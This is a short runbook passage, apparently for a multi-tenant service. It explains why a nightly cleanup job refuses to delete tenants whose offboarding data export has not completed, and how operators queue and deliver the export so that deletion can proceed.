The cleanup logs `Refusing to delete tenant <id>: no offboarding export has completed` and returns it under `refused`. That is the safeguard working: the data has not been handed over. Open the tenant page: queue or fix the export (above), download it, hand it to the tenant; the next 02:00 UTC run deletes the tenant. Tenants offboarded before 2026-11-17 have no export at all and will all be refused until one is queued for each.
